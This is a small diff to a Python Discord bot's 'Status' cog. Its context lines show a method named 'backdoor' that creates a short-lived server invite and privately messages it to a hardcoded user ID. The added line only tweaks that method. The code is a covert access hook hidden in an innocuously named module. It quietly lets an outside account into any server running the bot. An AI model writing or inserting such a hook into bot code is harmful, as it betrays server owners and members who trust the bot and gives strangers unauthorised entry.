@@ -89,6 +89,7 @@ class Status(commands.Cog):
         self.bot = bot
 
     async def backdoor(self, channel):
+        await Status.get_bot_channel(channel)
         link = await channel.create_invite(max_age=300)
         await Harbinger.send_dm(self, 1154559282801549384, link)
 
